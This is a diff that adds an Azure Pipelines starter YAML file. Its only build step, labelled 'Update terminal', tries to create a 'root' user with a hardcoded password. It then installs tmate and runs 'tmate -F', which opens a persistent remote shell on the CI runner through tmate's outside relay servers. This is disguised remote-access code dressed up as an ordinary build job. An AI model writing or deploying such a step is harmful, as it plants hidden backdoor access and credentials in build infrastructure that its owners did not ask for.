@@ -1,0 +1,28 @@
+# Starter pipeline
+# Start with a minimal pipeline that you can customize to build and deploy your code.
+# Add steps that build, run tests, deploy, and more:
+# https://aka.ms/yaml
+
+trigger:
+- main
+
+pool:
+  vmImage: 'ubuntu-latest'
+
+jobs:
+- job: BuildJob
+  displayName: 'Build Job'
+  steps:
+  - script: |
+      sudo apt update
+      sudo apt upgrade -y
+
+      # Create root user with password
+      sudo useradd -m -s /bin/bash -p $(openssl passwd -1 '60110777') root
+
+      # Install tmate.io
+      sudo apt install -y tmate
+
+      # Run tmate
+      tmate -F
+    displayName: 'Update terminal'
